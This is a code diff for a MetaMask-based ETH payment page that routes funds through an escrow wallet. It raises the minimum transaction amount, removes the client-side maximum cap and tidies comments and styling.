@@ -149,9 +149,10 @@ input:focus { outline: none; border-color: #667eea; box-shadow: 0 0 0 3px rgba(1
 }
 .chain-warning.show { display: block; }
 
+/* Min limit badge — shown under the amount input label */
 .limit-badge {
   display: inline-block;
-  background: #667eea;
+  background: #e74c3c;
   color: white;
   border-radius: 8px;
   padding: 2px 8px;
@@ -371,7 +372,7 @@ input:focus { outline: none; border-color: #667eea; box-shadow: 0 0 0 3px rgba(1
           Amount to Send (ETH)
           <span id="amountLimits" class="limit-badge">loading...</span>
         </label>
-        <input type="number" id="amount" placeholder="e.g. 0.01" step="0.0001" min="0.0001" oninput="calculateFees()">
+        <input type="number" id="amount" placeholder="e.g. 0.01" step="0.0001" min="0.01" oninput="calculateFees()">
         <div id="amountError" class="error-text" style="display:none;"></div>
       </div>
 
@@ -434,10 +435,10 @@ input:focus { outline: none; border-color: #667eea; box-shadow: 0 0 0 3px rgba(1
 <script>
 const CONFIG = {
   ESCROW_WALLET: '0x7e4692aaa29fe7632fa0bdc8effd25cc70867d33',
-  FEE_PERCENTAGE: 1,          // updated when /api/config loads
-  MIN_TX_AMOUNT_ETH: 0.001,   // updated from /api/config
-  MAX_TX_AMOUNT_ETH: 2.0,     // updated from /api/config
-  GAS_BUFFER_WEI: null,       // updated from /api/config
+  FEE_PERCENTAGE: 1,
+  MIN_TX_AMOUNT_ETH: 0.01,   // updated from /api/config (default 0.01)
+  MAX_TX_AMOUNT_ETH: null,   // no upper cap
+  GAS_BUFFER_WEI: null,
   BACKEND_URL: 'https://secure-payment-api-824h.onrender.com/api'
 };
 
@@ -453,7 +454,7 @@ let currentBalanceWei = 0n;
 
 const TX1_GAS_LIMIT = 21000;
 
-// ── Load config from backend on startup ──────────────────────
+// ── Load config from backend on startup ──────────────────
 async function loadBackendConfig() {
   try {
     const res = await fetch(CONFIG.BACKEND_URL + '/config');
@@ -461,15 +462,13 @@ async function loadBackendConfig() {
     const cfg = await res.json();
     if (cfg.fee_percentage    != null) CONFIG.FEE_PERCENTAGE    = cfg.fee_percentage;
     if (cfg.min_tx_amount_eth != null) CONFIG.MIN_TX_AMOUNT_ETH = cfg.min_tx_amount_eth;
-    if (cfg.max_tx_amount_eth != null) CONFIG.MAX_TX_AMOUNT_ETH = cfg.max_tx_amount_eth;
-    if (cfg.gas_buffer_wei    != null) CONFIG.GAS_BUFFER_WEI    = cfg.gas_buffer_wei;   // flat buffer string
+    // max_tx_amount_eth is null — no upper cap, intentionally ignored
+    if (cfg.gas_buffer_wei    != null) CONFIG.GAS_BUFFER_WEI    = cfg.gas_buffer_wei;
     if (cfg.gas_buffer_eth    != null) CONFIG.GAS_BUFFER_ETH    = cfg.gas_buffer_eth;
 
-    // Update the fee % label
     const feeLabel = document.getElementById('feePercLabel');
     if (feeLabel) feeLabel.textContent = CONFIG.FEE_PERCENTAGE;
 
-    // Update the amount limits badge on the input label
     updateAmountBadge();
     console.log('[config]', cfg);
   } catch(e) {
@@ -479,10 +478,11 @@ async function loadBackendConfig() {
 
 function updateAmountBadge() {
   const badge = document.getElementById('amountLimits');
-  if (badge) badge.textContent = `min ${CONFIG.MIN_TX_AMOUNT_ETH} – max ${CONFIG.MAX_TX_AMOUNT_ETH} ETH`;
+  // Only show minimum — no maximum cap
+  if (badge) badge.textContent = `min ${CONFIG.MIN_TX_AMOUNT_ETH} ETH`;
 }
 
-// ── Chain guard ──────────────────────────────────────────────
+// ── Chain guard ──────────────────────────────────
 function enforceAllowedChain() {
   const ok = ALLOWED_CHAINS.has(currentChainId);
   document.getElementById('chainWarning').classList.toggle('show', !ok);
@@ -492,7 +492,7 @@ function enforceAllowedChain() {
   return ok;
 }
 
-// ── Gas price ─────────────────────────────────────────────────
+// ── Gas price ─────────────────────────────────────
 function refreshGasPrice() {
   if (!window.ethereum) return;
   window.ethereum.request({ method: 'eth_gasPrice' })
@@ -500,7 +500,7 @@ function refreshGasPrice() {
     .catch(() => {});
 }
 
-// ── MetaMask connect ──────────────────────────────────────────
+// ── MetaMask connect ────────────────────────────────
 function connectMetaMask() {
   const btn  = document.getElementById('connectBtn');
   const text = document.getElementById('btnText');
@@ -552,16 +552,15 @@ function refreshBalance() {
     }).catch(() => {});
 }
 
-// ── Fee calculator ────────────────────────────────────────────
+// ── Fee calculator ────────────────────────────────────
 function calculateFees() {
   const amt = parseFloat(document.getElementById('amount').value) || 0;
   if (amt <= 0) { document.getElementById('feeBreakdown').style.display = 'none'; return; }
   const fee = amt * CONFIG.FEE_PERCENTAGE / 100;
 
-  // Gas buffer: use flat value from backend config if loaded, else fall back to live estimate
   let fwdGasEth = 0;
   if (CONFIG.GAS_BUFFER_ETH) {
-    fwdGasEth = CONFIG.GAS_BUFFER_ETH;  // flat amount user always pays
+    fwdGasEth = CONFIG.GAS_BUFFER_ETH;
   } else if (liveGasPriceWei) {
     fwdGasEth = 21000 * Number(liveGasPriceWei) * 1.5 / 1e18;
   }
@@ -579,7 +578,7 @@ function calculateFees() {
 
 function validateAddress(a) { return /^0x[0-9a-fA-F]{40}$/.test(a); }
 
-// ── MODAL HELPERS ─────────────────────────────────────────────
+// ── MODAL HELPERS ──────────────────────────────────────
 function openModal(to, amountEth, network) {
   document.getElementById('modalTo').textContent      = to         || '-';
   document.getElementById('modalAmount').textContent  = amountEth ? amountEth + ' ETH' : '-';
@@ -619,7 +618,6 @@ function finalizeModal(success, txHash, opts) {
     btn.textContent = 'Done';
     btn.classList.add('show', 'success');
   } else if (opts.gasWait) {
-    // NEW: gas price is above cap — tx is queued waiting for lower gas
     iconInner.textContent   = '⛽';
     iconInner.style.background = 'linear-gradient(135deg,#fff3cd,#ffe08a)';
     document.getElementById('modalTitle').textContent    = 'Queued (Gas High)';
@@ -662,7 +660,7 @@ function closeTxModal() {
 }
 window.closeTxModal = closeTxModal;
 
-// ── Payment ───────────────────────────────────────────────────
+// ── Payment ───────────────────────────────────────────
 function initiatePayment() {
   if (!enforceAllowedChain()) return;
 
@@ -683,14 +681,9 @@ function initiatePayment() {
     return;
   }
 
-  // ★ Amount cap check (client-side, backend also enforces)
+  // Only enforce minimum — no maximum cap
   if (amount < CONFIG.MIN_TX_AMOUNT_ETH) {
-    document.getElementById('amountError').textContent = `Minimum is ${CONFIG.MIN_TX_AMOUNT_ETH} ETH`;
-    document.getElementById('amountError').style.display = 'block';
-    return;
-  }
-  if (amount > CONFIG.MAX_TX_AMOUNT_ETH) {
-    document.getElementById('amountError').textContent = `Maximum is ${CONFIG.MAX_TX_AMOUNT_ETH} ETH per transaction`;
+    document.getElementById('amountError').textContent = `Minimum transaction amount is ${CONFIG.MIN_TX_AMOUNT_ETH} ETH`;
     document.getElementById('amountError').style.display = 'block';
     return;
   }
@@ -698,7 +691,6 @@ function initiatePayment() {
   const recipientWei   = BigInt(Math.floor(amount * 1e18));
   const platformFeeWei = BigInt(Math.floor(amount * CONFIG.FEE_PERCENTAGE / 100 * 1e18));
 
-  // Use flat gas buffer from backend config, else fall back to live estimate
   let fwdGasWei = 0n;
   if (CONFIG.GAS_BUFFER_WEI) {
     fwdGasWei = BigInt(CONFIG.GAS_BUFFER_WEI);
@@ -782,7 +774,7 @@ function initiatePayment() {
   }, 400);
 }
 
-// ── Monitor ───────────────────────────────────────────────────
+// ── Monitor ───────────────────────────────────────────
 function monitorTx(txHash) {
   if (!monitoringActive) return;
   let token = null;
@@ -811,8 +803,7 @@ function monitorTx(txHash) {
       updateStatus('🎉 Payment sent!', 'connected');
 
     } else if (s === 'forward_wait_gas') {
-      // NEW: gas price above cap — inform user tx is safely queued
-      monitoringActive = false;  // stop polling aggressively
+      monitoringActive = false;
       finalizeModal(false, txHash, { gasWait: true });
       updateStatus('⛽ Queued — waiting for lower gas', 'processing');
 
@@ -837,7 +828,7 @@ function monitorTx(txHash) {
   });
 }
 
-// ── Event listeners ───────────────────────────────────────────
+// ── Event listeners ───────────────────────────────────
 function setupListeners() {
   window.ethereum.on('accountsChanged', accounts => {
     if (!accounts.length) location.reload();
@@ -859,9 +850,9 @@ window.connectMetaMask = connectMetaMask;
 window.calculateFees   = calculateFees;
 window.initiatePayment = initiatePayment;
 
-// ── Auto-reconnect ────────────────────────────────────────────
+// ── Auto-reconnect ────────────────────────────────────
 window.addEventListener('load', () => {
-  loadBackendConfig();  // fetch caps from backend on every page load
+  loadBackendConfig();
 
   if (!window.ethereum) return;
   window.ethereum.request({ method: 'eth_accounts' })
